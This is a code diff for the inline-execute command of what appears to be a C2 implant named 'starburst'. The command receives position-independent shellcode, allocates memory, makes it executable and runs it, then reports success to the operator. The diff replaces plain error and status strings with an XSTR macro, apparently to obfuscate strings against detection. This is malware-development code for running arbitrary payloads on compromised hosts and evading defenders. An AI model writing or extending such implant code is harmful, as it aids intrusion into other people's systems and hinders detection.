@@ -23,7 +23,7 @@ auto declfn starburst::cmd_inline_execute(
     auto pic_data = parser_bytes( params, &pic_len );
     if ( !pic_data || pic_len == 0 ) {
         queue_response( inst, task_uuid, RESPONSE_ERROR,
-            symbol<char*>( const_cast<char*>( "no PIC data provided" ) ) );
+            XSTR( "no PIC data provided" ) );
         return;
     }
 
@@ -49,7 +49,7 @@ auto declfn starburst::cmd_inline_execute(
         MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE );
     if ( !mem ) {
         queue_response( inst, task_uuid, RESPONSE_ERROR,
-            symbol<char*>( const_cast<char*>( "VirtualAlloc failed" ) ) );
+            XSTR( "VirtualAlloc failed" ) );
         return;
     }
 
@@ -65,7 +65,7 @@ auto declfn starburst::cmd_inline_execute(
     if ( !pVirtualProtect ) {
         inst.kernel32.VirtualFree( mem, 0, MEM_RELEASE );
         queue_response( inst, task_uuid, RESPONSE_ERROR,
-            symbol<char*>( const_cast<char*>( "VirtualProtect resolve failed" ) ) );
+            XSTR( "VirtualProtect resolve failed" ) );
         return;
     }
 
@@ -73,7 +73,7 @@ auto declfn starburst::cmd_inline_execute(
     if ( !pVirtualProtect( mem, pic_len, PAGE_EXECUTE_READ, &old_protect ) ) {
         inst.kernel32.VirtualFree( mem, 0, MEM_RELEASE );
         queue_response( inst, task_uuid, RESPONSE_ERROR,
-            symbol<char*>( const_cast<char*>( "VirtualProtect failed" ) ) );
+            XSTR( "VirtualProtect failed" ) );
         return;
     }
 
@@ -86,11 +86,11 @@ auto declfn starburst::cmd_inline_execute(
 
     // build success message
     char msg[96] = { 0 };
-    str_copy( msg, symbol<char*>( const_cast<char*>( "Inline PIC executed (size: " ) ) );
+    str_copy( msg, XSTR( "Inline PIC executed (size: " ) );
     char num[16];
     int_to_str( num, pic_len, 10 );
     str_concat( msg, num );
-    str_concat( msg, symbol<char*>( const_cast<char*>( " bytes)" ) ) );
+    str_concat( msg, XSTR( " bytes)" ) );
 
     queue_response( inst, task_uuid, RESPONSE_SUCCESS, msg );
 }
